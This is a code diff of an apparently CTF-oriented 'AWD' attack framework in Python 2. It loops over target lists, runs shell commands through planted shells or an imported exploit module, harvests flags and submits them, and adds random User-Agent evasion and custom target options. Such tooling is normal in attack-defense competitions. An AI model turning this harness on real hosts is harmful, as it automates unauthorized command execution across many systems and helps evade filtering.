@@ -13,31 +13,34 @@ from optparse import OptionParser
 
 
 def attack(target,target_port,cmd,get_flag):
+    global headers
     is_vuln = 1
     flag = "hello world!"
     info = "success"
     reserve = 0    
+    if options.random_ua:
+	headers['User-Agent'] = random_ua()    
 
     if check_shell(target,target_port,""):
 	dump_success("check_shell success",target+":"+str(target_port),"function.py check_shell")
 	res = execute_shell(target,target_port,cmd)
     else:
 	dump_warning("check_shell failed",target+":"+str(target_port),"function.py check_shell")
-    
-    # Here we use the vulnerability we found in the source code
-    res = vulnerable_attack(target,target_port,cmd)
+	# Here we use the vulnerability we found in the source code
+	res = vulnerable_attack(target,target_port,cmd)
+    debug_print(res)
     res = res_filter(res)
     if get_flag:
 	if check_flag(res):
 	    flag = res
 	    dump_info("flag => " + res.replace(" ","").replace("\n",""))
 	else:
-	    dump_warning("flag format error,you may need to rewrite the shell", target+":"+str(target_port) ,"sample.py attack")
-    elif res=="error":
-	pass
+	    dump_warning("flag format error,you may need to rewrite the shell", target+":"+str(target_port) ,"run.py attack")
+    elif "error" in res:
+	dump_warning("execution cmd failed",target+":"+str(target_port),"run.py")
     else:
-	dump_success("execution cmd",target+":"+str(target_port),"sample.py")
-        dump_context(res)
+	dump_success("execution cmd",target+":"+str(target_port),"run.py")
+    dump_context(res)
 
     return flag,is_vuln,info,reserve 
 
@@ -45,13 +48,15 @@ def run():
     global raw_cmd,cmd,first_run
     cmd_split_prefix = "/bin/echo %s;"%cmd_prefix
     cmd_split_postfix = ";/bin/echo %s"%cmd_postfix
+    
     # if the target list exsists, load it. or regard it as ip addr
-    if os.path.isfile(target_list):
+    if udf_target:
+	targets = udf_target.split(',')
+    elif os.path.isfile(target_list):
 	targets = open(target_list).readlines()
-    else:
-	targets = [target_list]
+
     for target in targets:
-	target = target[:-1]
+	target = target.strip('\n')
         target,target_port = target.split(":")
 	reserve = 0
 	is_vuln = 1
@@ -75,20 +80,22 @@ def run():
 	    debug_print(traceback.format_exc())
 	    dump_error(str(e),target,load_script)
 	
-	dump_success("**** finish attack %s with %s ****"%(target+":"+target_port,raw_cmd))
 	#set the return value reverse => 0 and is_vuln => 1 and the flag has  been changed, post the flag.
 	if not reserve and  is_vuln and flag!="hello world!":
 	    res = post_flag(flag)
 	    if res:
-		dump_success("get flag success",target+":"+str(target_port),load_script)
+		dump_success("get flag success",target+":"+str(target_port),"run.py")
 	    else:
-		dump_error("flag check error",target+":"+str(target_port),load_script)
+		dump_error("flag check error",target+":"+str(target_port),"run.py")
 	elif is_vuln == 0:
-	    dump_error("server not vulnerable",target+":"+str(target_port),load_script)
+	    dump_error("server not vulnerable",target+":"+str(target_port),"run.py")
 	elif reserve==1:
-	    dump_error("reverse flag has been set",target+":"+str(target_port),load_script)
-    
-    dump_success("one round finished! sleeping...")
+	    dump_error("reverse flag has been set",target+":"+str(target_port),"run.py")
+	dump_success("**** finish attack %s with %s ****"%(target+":"+target_port,raw_cmd))
+	print ""
+	print ""
+	print ""
+	print ""
     time.sleep(script_runtime_span)
 		 
 def banner():
@@ -106,7 +113,6 @@ def banner():
 
 if __name__ == '__main__':
     banner()
-    dump_info("Start the AWD Intel to hack the planet :)")
     parser = OptionParser()
     parser.add_option("-m", "--module",\
                      dest="module", default="sample",\
@@ -119,10 +125,21 @@ if __name__ == '__main__':
     parser.add_option("-r", "--random_ua",\
                      dest="random_ua", default="False",\
                       help="Enable the random UA to avoid filter")
+    parser.add_option("-l", "--loop",\
+                     dest="loop_count", default="65535",\
+                      help="To set the loop count for this program")
+    parser.add_option("-t", "--udf_target",\
+                     dest="udf_target", default="",\
+                      help="To set the target for attacking, split with ,")
     (options, args) = parser.parse_args()
+    dump_info("Start the AWD Intel to hack the planet :)")
     load_script = options.module
     cmd = options.command
-    if cmd=="get_flag":
+    loop_count = int(options.loop_count)
+    udf_target = options.udf_target
+    if options.random_ua:
+	dump_info("enable feature random user-agent")
+    if cmd=="get_flag" or cmd=="get_flag_2":
 	run_for_flag = 1
     vulnerable_attack = __import__(load_script).vulnerable_attack
 
@@ -136,12 +153,13 @@ if __name__ == '__main__':
     else:
         func = None
 
-    while 1:
+    while loop_count > 0:
         try:
 	    run()
         except  KeyboardInterrupt:
 	    dump_error("Program stoped by user, existing...")
 	    exit()
-	print ""
         dump_info("--------------------- one round finish -----------------------")
 	print ""
+	loop_count -= 1
+    dump_info("finish all tasks, have a nice day :)")
